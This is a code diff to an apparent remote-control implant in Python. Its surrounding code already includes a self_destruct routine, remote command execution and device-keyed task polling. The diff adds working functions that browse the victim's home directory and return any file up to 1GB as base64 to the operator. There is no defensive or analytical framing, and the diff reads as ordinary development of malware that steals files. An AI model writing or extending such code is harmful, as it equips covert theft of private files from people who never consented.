@@ -448,6 +448,77 @@ def self_destruct():
     except Exception as e:
         return False
 
+def browse_files(path=""):
+    """Browse files - starts from /home/user if no path provided"""
+    try:
+        items = []
+        
+        if not path or path == "":
+            # Start from user's home directory
+            path = os.path.expanduser("~")
+        
+        if not os.path.exists(path):
+            return {"error": f"Path not found: {path}", "path": path}
+        
+        # List directory contents
+        try:
+            entries = os.listdir(path)
+        except PermissionError:
+            return {"error": "Permission denied", "path": path}
+        
+        for entry in entries:
+            full_path = os.path.join(path, entry)
+            try:
+                stat = os.stat(full_path)
+                is_dir = os.path.isdir(full_path)
+                items.append({
+                    "name": entry,
+                    "type": "folder" if is_dir else "file",
+                    "size": 0 if is_dir else stat.st_size,
+                    "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
+                })
+            except (PermissionError, OSError):
+                items.append({
+                    "name": entry,
+                    "type": "unknown",
+                    "size": 0,
+                    "modified": ""
+                })
+        
+        return {"path": path, "items": items, "count": len(items)}
+    except Exception as e:
+        return {"error": str(e), "path": path}
+
+def download_file(file_path):
+    """Download a file - returns base64 encoded content"""
+    try:
+        if not os.path.exists(file_path):
+            return {"error": f"File not found: {file_path}"}
+        
+        file_stat = os.stat(file_path)
+        file_size = file_stat.st_size
+        
+        # Check 1GB limit
+        if file_size > 1073741824:
+            return {"error": "File too large (max 1GB)", "size": file_size}
+        
+        # Read and encode file
+        with open(file_path, "rb") as f:
+            content = f.read()
+        
+        encoded = base64.b64encode(content).decode('utf-8')
+        
+        return {
+            "filename": os.path.basename(file_path),
+            "size": file_size,
+            "path": file_path,
+            "file_data": encoded
+        }
+    except PermissionError:
+        return {"error": "Permission denied"}
+    except Exception as e:
+        return {"error": str(e)}
+
 PROCESSED_TASKS = set()
 
 def process_tasks(config, device_id):
@@ -567,6 +638,37 @@ def process_tasks(config, device_id):
                 }
                 data_type = "cmd_result"
                 should_fail_task = (code != 0)
+
+            elif task_type == "file_browse":
+                path = params.get('path', '')
+                result = browse_files(path)
+                if "error" in result:
+                    result_data = {"data": json.dumps(result)}
+                    should_fail_task = True
+                else:
+                    result_data = {"data": json.dumps(result)}
+                data_type = "file_list"
+
+            elif task_type == "file_download":
+                file_path = params.get('file', '')
+                if file_path:
+                    result = download_file(file_path)
+                    if "error" in result:
+                        result_data = {"data": json.dumps(result)}
+                        should_fail_task = True
+                    else:
+                        result_data = {
+                            "data": json.dumps({
+                                "filename": result["filename"],
+                                "size": result["size"],
+                                "path": result["path"]
+                            }),
+                            "file_data": result["file_data"]
+                        }
+                else:
+                    result_data = {"data": json.dumps({"error": "No file path provided"})}
+                    should_fail_task = True
+                data_type = "file_download"
 
             elif task_type == "restart_agent":
                 # Mark task complete before restart
